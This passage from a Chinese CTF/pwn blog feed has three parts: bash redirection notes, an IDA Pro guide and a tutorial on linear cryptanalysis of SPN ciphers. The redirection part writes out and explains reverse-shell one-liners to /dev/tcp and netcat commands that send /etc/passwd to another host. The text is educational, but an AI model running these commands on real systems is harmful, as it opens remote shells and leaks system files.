<h3 id="0x03-重定向"><a href="#0x03-重定向" class="headerlink" title="0x03 重定向"></a>0x03 重定向</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&quot;1&gt;&quot; 通常可以省略成 &quot;&gt;&quot;</div><div class="line">1&gt;&amp;2  把正确返回值 传递给 2输出通道 ，&amp;2表示2输出通道 </div><div class="line">2&gt;&amp;1 把错误返回值 传递给1输出通道, 同样&amp;1表示1输出通道. </div><div class="line"></div><div class="line">反弹shell:</div><div class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</div><div class="line">bash -i 一个交互的bash，并且连上具体ip、port，</div><div class="line">&gt;&amp; /dev/tcp/HOST/PORT  表示标准输入与标准输出通过这个连接发出</div><div class="line">0&gt;&amp;1  标准输入通过这个连接读入</div></pre></td></tr></table></figure>
<p><a href="http://www.00theway.org/2017/07/11/bash%20%E5%8F%8D%E5%BC%B9shell/" target="_blank" rel="external">反弹shell的官方解释</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">/dev/fd/fd</div><div class="line">If fd is a valid integer, file descriptor fd is duplicated.</div><div class="line"></div><div class="line">/dev/stdin</div><div class="line">File descriptor 0 is duplicated.</div><div class="line"></div><div class="line">/dev/stdout</div><div class="line">File descriptor 1 is duplicated.</div><div class="line"></div><div class="line">/dev/stderr</div><div class="line">File descriptor 2 is duplicated.</div><div class="line"></div><div class="line">/dev/tcp/host/port</div><div class="line">If host is a valid hostname or Internet address, and port is an integer port number or service name, Bash attempts to open the corresponding TCP socket.</div><div class="line"></div><div class="line">/dev/udp/host/port</div><div class="line">If host is a valid hostname or Internet address, and port is an integer port number or service name, Bash attempts to open the corresponding UDP socket.</div></pre></td></tr></table></figure>
<p>&quot;>\&amp;&quot;操作符的含义：</p>
<ul>
<li>在“&gt;&amp;word”语法中，当word不是数字或“-”字符时，“&gt;&amp;”表示标准输出和标准错误重定向到文件，此时与操作符“&amp;&gt;”功能一样。</li>
<li>在“&gt;&amp;word”语法中，当word是数字或“-”字符时，操作符“&gt;&amp;”表示复制输出文件描述符</li>
</ul>
<ul>
<li>&quot;&gt;word&quot; 当word为1的时候，</li>
</ul>
<ul>
<li>“word&lt;”  当word为0，代表后面的输出转为输入；当word为1或2时，其实含义与&quot;&gt;1&quot;或&quot;&gt;2&quot;一致</li>
</ul>
<p>仅有代码”bash -i”时输入输出状态</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">标准输入、标准输出和标准错误 全部指向shell（此状态定义为状态A）</div><div class="line"> ---       +--------+</div><div class="line">( 0 ) ----&gt;| shell  |</div><div class="line"> ---       +--------+</div><div class="line"> ---       +--------+</div><div class="line">( 1 ) ----&gt;| shell  |</div><div class="line"> ---       +--------+</div><div class="line"> ---       +--------+</div><div class="line">( 2 ) ----&gt;|  shell |</div><div class="line"> ---       +--------+</div></pre></td></tr></table></figure>
<p>命令“&gt;&amp; /dev/tcp/host/port”是对标准输出和标准错误的重定向，此时的输入输出状态</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">标准输入指向shell，标准输出和标准错误指向socket连接文件（此状态定义为状态B）</div><div class="line"> ---       +--------+</div><div class="line">( 0 ) ----&gt;| shell  |</div><div class="line"> ---       +--------+</div><div class="line"> ---       +--------+           +------------------+</div><div class="line">( 1 ) ----&gt;| shell  |  -----&gt;   |/dev/tcp/host/port|</div><div class="line"> ---       +--------+    ---&gt;   +------------------+</div><div class="line">      	       	        /</div><div class="line"> ---       +--------+  /</div><div class="line">( 2 ) ----&gt;| shell  | / </div><div class="line"> ---       +--------+</div></pre></td></tr></table></figure>
<p>因此执行命令“bash -i &gt;&amp; /dev/tcp/host/port”时将标准输出和标准错误进行了重定向,使标准输出和标准错误指向socket连接文件，标准输入指向原有shell不变。</p>
<p>使用命令“bash -i &gt;&amp; /dev/tcp/host/port”还不能反弹shell，因为此时的输入还是指向shell，此时会出现在被控端（执行反弹shell命令的终端）执行命令，在控制端（监听端口的终端）回显得现象。</p>
<p>命令“0&gt;&amp;1”是对文件描述符的拷贝，是将0[标准输入]重定向到了1[标准输出]指向的位置，此时1[标准输出]指向的是socket连接文件，重定向完成后，0[标准输入]也指向了socket连接文件，状态如下</p>
<blockquote>
<p>在状态B时，2[标准错误]指向的也是socket连接文件，因此命令”0&gt;&amp;2”与“0&gt;&amp;1”执行完后结果是一样的,所以反弹shell命令可以写成“bash -i &gt;&amp; /dev/tcp/host/port 0&gt;&amp;2”</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">标准输入、标准输出和标准错误全部指向socket连接文件（此状态定义为状态C）</div><div class="line"> ---       +--------+</div><div class="line">( 0 ) ----&gt;| shell  |\</div><div class="line"> ---       +--------+ \</div><div class="line">                       \</div><div class="line"> ---       +--------+    ---&gt;   +------------------+</div><div class="line">( 1 ) ----&gt;| shell  |  -----&gt;   |/dev/tcp/host/port|</div><div class="line"> ---       +--------+    ---&gt;   +------------------+</div><div class="line">      	       	        /</div><div class="line"> ---       +--------+  /</div><div class="line">( 2 ) ----&gt;| shell  | / </div><div class="line"> ---       +--------+</div></pre></td></tr></table></figure>
<p>命令”bash -i 5\&lt;>/dev/tcp/host/port 0&gt;&amp;5 1&gt;&amp;5”也可以反弹shell</p>
<p>说明：\&lt;>代表的是输入输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"> ---       +--------+</div><div class="line">( 0 ) ----&gt;| shell  |\</div><div class="line"> ---       +--------+ \</div><div class="line">                       \</div><div class="line"> ---       +--------+    ---&gt;  ---    ------1-----&gt;   +------------------+</div><div class="line">( 1 ) ----&gt;| shell  |  -----&gt; ( 5 )                   |/dev/tcp/host/port|</div><div class="line"> ---       +--------+    ---&gt;  ---    &lt;-----0------   +------------------+</div><div class="line">      	       	        /</div><div class="line"> ---       +--------+  /</div><div class="line">( 2 ) ----&gt;| shell  | / </div><div class="line"> ---       +--------+</div></pre></td></tr></table></figure>
<p>其他参考文档</p>
<p><a href="https://www.gnu.org/software/bash/manual/html_node/Redirections.html" target="_blank" rel="external">https://www.gnu.org/software/bash/manual/html_node/Redirections.html</a></p>
<h3 id="0x04-下载文件"><a href="#0x04-下载文件" class="headerlink" title="0x04 下载文件"></a>0x04 下载文件</h3><p>一般linux上或多或少会支持一些命令wget、curl等，当这些命令存在时就可以完成文件的下载。</p>
<p>但是特殊情况下是这些命令都不存在。下面讲一讲其他办法：</p>
<h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">接受: ip:192.168.228.221 1234 passwd.txt    </div><div class="line">发送: ip:192.168.228.222 1234 /etc/passwd</div><div class="line"></div><div class="line">方法一：</div><div class="line">接受方</div><div class="line">nc -l 1234 |tar -zxvf -</div><div class="line">发送方</div><div class="line">tar -zcvf - dir |nc 192.168.228.221 1234</div><div class="line"></div><div class="line">方法二：</div><div class="line">接受方</div><div class="line">nc -l 1234 &gt; passwd.txt</div><div class="line">发送方</div><div class="line">nc 192.168.228.221 1234 &lt; /etc/passwd</div></pre></td></tr></table></figure>
<h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">import urllib</div></pre></td></tr></table></figure>
<h4 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h4><p>一般的虚拟机上都会有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure>
<h4 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure>
<h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure>
<h4 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure>
<h4 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h4><p>上面重定向讲得十分透彻，所以这儿就可以快速写出对应的bash脚本了(最终屈服了，没写出来，仍然用的反弹的shell)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">将/usr/bin/curl 转化为16进制值，切片追加传输</div><div class="line"></div><div class="line">echo 0x31323334 |xxd -r </div><div class="line">1234</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;cat &lt;&lt; EOF &gt; hex2str\n#!/bin/sh\nI=0\nwhile [ \$I -lt \$&#123;#1&#125; ];\ndo\n    echo -en \&quot;\\x\&quot;\$&#123;1:\$I:2&#125;\n    let \&quot;I += 2\&quot;\ndone\n\nEOF\n&quot;</div></pre></td></tr></table></figure>
<p>也即：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">cat &lt;&lt; EOF &gt; hex2str</div><div class="line">#!/bin/sh</div><div class="line">I=0</div><div class="line">while [ $I -lt $&#123;#1&#125; ];</div><div class="line">do</div><div class="line">    echo -en &quot;\x&quot;$&#123;1:$I:2&#125;</div><div class="line">    let &quot;I += 2&quot;</div><div class="line">done</div><div class="line">EOF</div></pre></td></tr></table></figure>
<blockquote>
<p>$hex2str 313233</p>
<p>123$</p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> linux </tag>
            
            <tag> shell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[IDA使用指南]]></title>
      <url>/2018/04/08/IDA%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
      <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>IDA之于逆向人员、PWN手的重要性几乎等同于左右手之于人。所以学好IDA是我们关键的一步。</p>
<h3 id="0x02-基本快捷键"><a href="#0x02-基本快捷键" class="headerlink" title="0x02 基本快捷键"></a>0x02 基本快捷键</h3><h4 id="2-1-View"><a href="#2-1-View" class="headerlink" title="2.1 View"></a>2.1 View</h4><h4 id="2-2-Jump"><a href="#2-2-Jump" class="headerlink" title="2.2 Jump"></a>2.2 Jump</h4><ul>
<li>Esc   jump to previous position</li>
<li>Ctrl+Enter  jump to next postion</li>
</ul>
<h3 id="0x03-patch"><a href="#0x03-patch" class="headerlink" title="0x03 patch"></a>0x03 patch</h3><p>以前逆向的时候，为了将有些部分的jz改为jnz，我们很可能会关闭IDA-gui，在UltraEdit中找到指定位置进行更改。这种操作十分麻烦，而且费时，所以产生了一下的方法！</p>
<ol>
<li><strong>在IDA安装目录中，找到cfg/idagui.cfg，更改“ApplyPatches”改为1</strong></li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">原来：</div><div class="line">&quot;ApplyPatches&quot;          =       0            // apply patches to input file</div><div class="line">现在</div><div class="line">&quot;ApplyPatches&quot;          =       1            // apply patches to input file</div></pre></td></tr></table></figure>
<ol start="2">
<li>如果想patch某个代码段，在<strong>IDA View窗口</strong>将光标指向对应的汇编代码，这时会发现在<strong>Hex View窗口</strong> 中对应汇编代码的16进制会突出显示。<strong>右键选择Edit（或者直接用F2）</strong>，即可对目标代码进行更改；<strong>最后右键选择Apply Changes（或者使用F2）</strong> 即可完成更改</li>
<li>patch之后，你可以直接看到patch更改后对应的汇编代码，也能继续调试</li>
</ol>
<h4 id="3-1-Change-byte"><a href="#3-1-Change-byte" class="headerlink" title="3.1 Change byte"></a>3.1 Change byte</h4><p>在Hex View窗口中右键更改</p>
<p>Edit-&gt;Patch Program -&gt;Change byte</p>
<h4 id="3-2-Change-word"><a href="#3-2-Change-word" class="headerlink" title="3.2 Change word"></a>3.2 Change word</h4><p>改字节  Edit-&gt;Patch Program -&gt;Change word</p>
<h4 id="3-3-Assemble"><a href="#3-3-Assemble" class="headerlink" title="3.3 Assemble"></a>3.3 Assemble</h4><p>Edit-&gt;Patch Program -&gt;Assemble</p>
<h4 id="3-4-Apply-patches-to-input-file"><a href="#3-4-Apply-patches-to-input-file" class="headerlink" title="3.4 Apply patches to input file"></a>3.4 Apply patches to input file</h4><p>Edit-&gt;Patch Program -&gt;Apply patches to input file</p>
<h3 id="0x04-Debug"><a href="#0x04-Debug" class="headerlink" title="0x04 Debug"></a>0x04 Debug</h3><h4 id="4-1-远程调试"><a href="#4-1-远程调试" class="headerlink" title="4.1 远程调试"></a>4.1 远程调试</h4><blockquote>
<ol>
<li>IDA 7.0给了很多远程调试器（dbgsrv文件夹下），只需要将与系统程序对应的server放到被调试的文件目录下即可。</li>
<li>运行该server</li>
<li>在IDA中启动对应的远程调试器，选择Debugger-&gt;Process Options，更改Application、Input File、Directory、Parameters、Hostname、Port、Password</li>
</ol>
</blockquote>
<h4 id="4-2-调试快捷键"><a href="#4-2-调试快捷键" class="headerlink" title="4.2 调试快捷键"></a>4.2 调试快捷键</h4><ul>
<li>F7 - step into</li>
<li>F8 - step over</li>
<li>F9 - start Process</li>
<li>F4 - Run to Cursor</li>
<li>Ctrl + F7  -  Run until Return</li>
<li>Ctrl + F2 - Terminate Process</li>
</ul>
<h4 id="4-3-Debug-View"><a href="#4-3-Debug-View" class="headerlink" title="4.3 Debug View"></a>4.3 Debug View</h4><p>如果你调试过程序，你会发现调试窗口其实是一个独立的多窗口环境，这里面有IDA View-RIP，General registers，Hex View，Stack View，Output window，Python输入框</p>
<h5 id="4-3-1-窗口布局"><a href="#4-3-1-窗口布局" class="headerlink" title="4.3.1 窗口布局"></a>4.3.1 窗口布局</h5><p>建议使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;           [IDA View-RIP]                  &#125; &#123; [General registers] [Hex View] [Stack View]&#125;</div><div class="line">&#123;           output window                                                                  &#125;</div><div class="line">&#123;Python [                                                                                 ]&#125;</div></pre></td></tr></table></figure>
<h5 id="4-3-2-IDA-View-RIP"><a href="#4-3-2-IDA-View-RIP" class="headerlink" title="4.3.2 IDA View-RIP"></a>4.3.2 IDA View-RIP</h5><p>该窗口支持多种显示，其中有静态分析的跳转图(Graph View)，也有汇编文本(Text View)</p>
<p>所有调整都可以通过右键触发</p>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ida </tag>
            
            <tag> 调试 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[线性分析法]]></title>
      <url>/2018/04/03/%E7%BA%BF%E6%80%A7%E5%88%86%E6%9E%90%E6%B3%95/</url>
      <content type="html"><![CDATA[<h3 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h3><p>线性分析法、差分分析法作为SPN(Substitution Permutation Network)的常用解法，一直让密码学家痴迷。最近也因为0ctf的一些密码学题目，对线性分析法有了一定的了解，并想写篇博客将具体内容详细展示！</p>
<h3 id="0x01-SPN网络介绍"><a href="#0x01-SPN网络介绍" class="headerlink" title="0x01 SPN网络介绍"></a>0x01 SPN网络介绍</h3><p>首先我们来看看这个spn网络</p>
<p><img src="\images\2018-04-03\1.png" alt="spn网络"></p>
<p>每轮都包含3个步骤：substitution（代替）、permutation（置换）、key-mixing（轮密钥加）</p>
<h4 id="1-1-substitution"><a href="#1-1-substitution" class="headerlink" title="1.1 substitution"></a>1.1 substitution</h4><p>输入4比特，输出4比特。这是一个双射，让集合$0-(2^4-1)$ 与其本身一一对应。</p>
<table>
<thead>
<tr>
<th>input</th>
<th>0</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
<th>7</th>
<th>8</th>
<th>9</th>
<th>A</th>
<th>B</th>
<th>C</th>
<th>D</th>
<th>E</th>
<th>F</th>
</tr>
</thead>
<tbody>
<tr>
<td>output</td>
<td>E</td>
<td>4</td>
<td>D</td>
<td>1</td>
<td>2</td>
<td>F</td>
<td>B</td>
<td>8</td>
<td>3</td>
<td>A</td>
<td>6</td>
<td>C</td>
<td>5</td>
<td>9</td>
<td>0</td>
<td>7</td>
</tr>
</tbody>
</table>
<p>它起到混淆的作用！</p>
<h4 id="1-2-permutation"><a href="#1-2-permutation" class="headerlink" title="1.2 permutation"></a>1.2 permutation</h4><p>输入16比特的数，对其各个比特进行置换。</p>
<table>
<thead>
<tr>
<th>input</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
<th>7</th>
<th>8</th>
<th>9</th>
<th>10</th>
<th>11</th>
<th>12</th>
<th>13</th>
<th>14</th>
<th>15</th>
<th>16</th>
</tr>
</thead>
<tbody>
<tr>
<td>output</td>
<td>1</td>
<td>5</td>
<td>9</td>
<td>13</td>
<td>2</td>
<td>6</td>
<td>10</td>
<td>14</td>
<td>3</td>
<td>7</td>
<td>11</td>
<td>15</td>
<td>4</td>
<td>8</td>
<td>12</td>
<td>16</td>
</tr>
</tbody>
</table>
<p>其实可以看出，这是对上面4组S盒输出的16个比特进行简单的置换。</p>
<p>这是一个可逆的操作！</p>
<h4 id="1-3-轮密钥加"><a href="#1-3-轮密钥加" class="headerlink" title="1.3 轮密钥加"></a>1.3 轮密钥加</h4><p>提到轮密钥加，我们不得不提轮密钥的产生。一般的轮密钥产生都是利用一种具有雪崩效应的算法，根据初始密钥，生成每一轮的密钥！比较少见的是给出一段较长的密钥，直接切割出每轮的密钥。</p>
<p>最好不要出现以下几种密钥：</p>
<blockquote>
<ol>
<li>简单密钥。对于使用的0000....00或者0101..0101类型的密钥，最好不要使用</li>
<li>可通过某一轮的密钥反解出所有密钥。（前提是你知道某一轮的密钥。。。）</li>
<li>轮密钥不要相关。如果轮密钥只是简单的进行了固定的循环左移或右移变换，那么所有的密钥将会有相同数量的1，以及相同距离的1。这都是很危险的。<a href="https://en.wikipedia.org/wiki/Related-key_attack" target="_blank" rel="external">Related-key attack</a></li>
</ol>
</blockquote>
<h4 id="1-4-解密"><a href="#1-4-解密" class="headerlink" title="1.4 解密"></a>1.4 解密</h4><p>其实，由于上面的所有变换都是可逆的运算，所以最终都能根据轮密码求解出原文。</p>
<h3 id="0x02-线性分析法简述"><a href="#0x02-线性分析法简述" class="headerlink" title="0x02 线性分析法简述"></a>0x02 线性分析法简述</h3><p>线性分析法的基本想法是生成一系列大概可用的线性表达式，如：</p>
<p>$X_{i_1}\oplus X_{i_2} ... X_{i_u} \oplus Y_{j_1} \oplus Y_{j_2} ... Y_{j_v}=0$</p>
<p>其中 $X_i$ 表示第i个比特的输入，$Y_j$ 表示第j个比特的输出</p>
<p>其实当我们比较随机的选取这u+v个比特，最终上述表达式成功的概率大概是1/2。</p>
<p><strong>线性分析法基本原理：如果线性表达式成立的概率距离1/2越远，那么越容易使用线性分析法。若线性表达式发生概率为$p_L$， 那么$|p_L-1/2|$越大越好。</strong></p>
<p>能够使用线性分析法的环境：线性分析可行一般取决于S盒设计，如果S盒导致出现多个线性表达式成立的概率距离1/2很远，那么最终分析结果将会越好；其次就是密钥长度不要太长，轮次不能太多，否则分析难度将会急剧增加。</p>
<h4 id="2-1-Piling-Up-Principle（叠加原理）"><a href="#2-1-Piling-Up-Principle（叠加原理）" class="headerlink" title="2.1 Piling-Up Principle（叠加原理）"></a>2.1 Piling-Up Principle（叠加原理）</h4><p>$$<br>\begin{equation}<br>P_r(X_1=i)=\left [<br>             \begin{array}{lr}<br>              p_1, i=0 \newline<br>             1-p_1, i=1 \newline<br>             \end{array}<br>\right]\<br>\end{equation}<br>$$</p>
<p>而<br>$$<br>P_r(X_2=i)=\left [<br>             \begin{array} {lr}<br>              p_2, i=0 \newline<br>             1-p_2, i=1 \newline<br>             \end{array}<br>\right]<br>$$</p>
<p>于是有：<br>$$<br>P_r(X_1 \oplus X_2) = P_r(X_1=X_2)=p_1 p_2 + (1-p_1)(1-p_2)<br>$$<br>令 $p_1=1/2+\epsilon_1$， $p_2=1/2+\epsilon_2$</p>
<p>则有 $P_r(X_1 \oplus X_2 = 0)=1/2+2\epsilon_1 \epsilon_2$</p>
<p>我们可以简写 $\epsilon_{1,2} = 2\epsilon_1 \epsilon_2$</p>
<p>根据Piling-Up Lemma (Matsui) ，我们可以快速得到：</p>
<p>$P_r(X_1 \oplus ... \oplus X_n = 0) = 1/2 + 2^{n-1} \prod_{i=1} ^n \epsilon_i$</p>
<p>如果其中某一个$p_i=1/2$， 那么最终的 $P_r(X_1 \oplus ... \oplus X_n = 0) = 1/2$</p>
<p>假设 $X_1 \oplus X_2$ 与 $X_2 \oplus X_3$ 是相互独立的，那么我么有：</p>
<p>$P_r(X_1 \oplus X_3 = 0) = 1/2 +2\epsilon_{1,2} \epsilon_{2,3}$</p>
<p>所以在这种情况下有 $\epsilon_{1,3} = 2\epsilon_{1,2} \epsilon_{2,3}$</p>
<h4 id="2-2-分析S盒"><a href="#2-2-分析S盒" class="headerlink" title="2.2 分析S盒"></a>2.2 分析S盒</h4><p>假设S盒输入四位，输出四位，如下图所示：</p>
<p><img src="\images\2018-04-03\2.png" alt="S盒"></p>
<p>假设现在使用的查看的是$X_2 \oplus X_3 \oplus =Y_1 \oplus Y_3 \oplus Y_4$</p>
<p>我们首先输入16个可能的输入作为X，然后检查对应的可能输出作为Y。我们发现这16个中有12个符合上面的等式。所以上式发生的概率偏差为 $12/16-1/2=1/4$</p>
<p>假设现在使用的查看的是$X_1 \oplus X_4 \oplus =Y_2$</p>
<p>我们首先输入16个可能的输入作为X，然后检查对应的可能输出作为Y。我们发现这16个中有8个符合上面的等式。所以上式发生的概率偏差为 $8/16-1/2=0$</p>
<p><img src="\images\2018-04-03\3.png" alt="近似值"></p>
<p>上述讲述了通常意义上的方法，那么我们如何运用算法来求解呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">import sys</div><div class="line"></div><div class="line"># sbox from the tutorial</div><div class="line">sbox = [0xe, 4, 0xd, 1, 2, 0xf, 0xb, 8, 3, 0xa, 6, 0xc, 5, 9, 0, 7]</div><div class="line">#sbox = [0xf, 3, 0xa, 6, 4, 1, 0xb, 9, 0xe, 5, 0, 0xd, 2, 0xc, 7, 8]</div><div class="line">SIZE_SBOX = len(sbox)</div><div class="line">linear_approx_table = [0]*SIZE_SBOX*SIZE_SBOX</div><div class="line"></div><div class="line"># compute the linear approximation for a given &quot;input = output&quot; equation</div><div class="line">def linearApprox(input_int, output_int):</div><div class="line">    total = 0</div><div class="line">    # range over the input</div><div class="line">    for ii in range(SIZE_SBOX):</div><div class="line">        # get input and output of our equations</div><div class="line">        input_masked = ii &amp; input_int</div><div class="line">        output_masked = sbox[ii] &amp; output_int</div><div class="line">        # same result?</div><div class="line">        if (bin(input_masked).count(&quot;1&quot;) - bin(output_masked).count(&quot;1&quot;)) % 2 == 0:</div><div class="line">            total += 1</div><div class="line">    # get the number of results compared to 8/16</div><div class="line">    result = total - (SIZE_SBOX//2)</div><div class="line">    if result &gt; 0:</div><div class="line">        result = &quot;+&quot; + str(result)</div><div class="line">    else:</div><div class="line">        result = str(result)</div><div class="line"></div><div class="line">    return result</div><div class="line"></div><div class="line">def main():</div><div class="line">    # rows</div><div class="line"></div><div class="line">    sys.stdout.write( &quot;     | &quot;)</div><div class="line">    for i in range(SIZE_SBOX):</div><div class="line">        sys.stdout.write(str(i).rjust(4) + &quot; &quot;)</div><div class="line">    print &quot;&quot;</div><div class="line">    print &quot; &quot; + &quot;-&quot; * (SIZE_SBOX * 5 + 5)</div><div class="line">    for row in range(SIZE_SBOX):</div><div class="line">        sys.stdout.write(str(row).rjust(4) +  &quot; | &quot;)</div><div class="line">        # cols</div><div class="line">        for col in range(SIZE_SBOX):</div><div class="line">            # print the linear approx</div><div class="line">            r = linearApprox(row,col)</div><div class="line">            sys.stdout.write(r.rjust(4) + &quot; &quot;)</div><div class="line">            linear_approx_table[row*SIZE_SBOX+col]=(int(r))</div><div class="line">        print &quot;&quot;</div><div class="line">    print linear_approx_table</div><div class="line"></div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<p>根据上述算法，我们得到下面这张表linear Approximation Table：</p>
<p><img src="\images\2018-04-03\4.png" alt=""></p>
<p>我们来讲一讲这张表的含义：</p>
<p><strong>Input sum代表的是所有比特位的累加和，output sum表示所有比特位的累加和。而在表中的数字代表的是：输入和的2进制表达式对应的输入与输出和的2进制表达式对应的输出组成的线性表达式，其成立的次数减去所有可能数的一半。</strong></p>
<p>例如：$X_2 \oplus X_3 \oplus =Y_1 \oplus Y_3 \oplus Y_4$ 对应的就是$(2^2+2^1,2^3+2+2^0)=(6,11)=+4$，概率偏差就是1/4</p>
<p>$X_1 \oplus X_4 \oplus =Y_2$ 对应的就是$(2^3+1,2^2)=(9,4)=0$  其概率偏差为0</p>
<p>几个常用的引理：</p>
<blockquote>
<ol>
<li>任何输出位的线性组合，在遍历ii，求得sbox[ii] &amp; output_sum后，必定具有相同数量的0和1</li>
<li>所有无输出比特的线性组合与所有无输入的线性组合相等，都是1/2，即左上角（0,0）是sbox_size/2，而(0,i)=(i,0)=0， 其中i不为0。</li>
<li>所有行和的绝对值为sbox_size/2，所有列和的绝对值为sbox_size/2。</li>
</ol>
</blockquote>
<h4 id="2-3-引理的证明"><a href="#2-3-引理的证明" class="headerlink" title="2.3 引理的证明"></a>2.3 引理的证明</h4><p>根据算法，我们可以写出下列表达式</p>
<p>我们首先看一下input_sum确定的情况：<br>$$<br>\sum_{j=0} ^n \sum_{i=0} ^n P(output_{mask},input_{mask})=\sum_{j=0} ^n \sum_{i=0} ^n P(i \&amp; input_{sum}, sbox[i] \&amp; j)<br>= \sum_{i=0} ^n \sum_{j=0} ^n P(i \&amp; input_{sum}, sbox[i] \&amp; j) =  \sum_{sbox[i]=0}  P(i \&amp; input_{sum}, sbox[i] \&amp; j)  =  -sbox_{size}/2 或者 +sbox_{size}/2<br>$$</p>
